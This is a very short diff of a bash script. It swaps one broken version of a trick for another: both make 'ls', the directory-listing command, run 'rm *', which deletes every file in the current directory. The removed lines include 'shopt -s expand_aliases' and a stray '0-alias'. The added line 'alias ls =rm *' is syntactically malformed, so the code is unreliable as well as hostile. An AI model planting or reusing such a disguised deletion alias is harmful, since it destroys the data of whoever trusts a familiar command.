@@ -1,4 +1,2 @@
 #!/bin/bash
-shopt -s expand_aliases
-alias ls ="rm *"
-0-alias
+alias ls =rm *
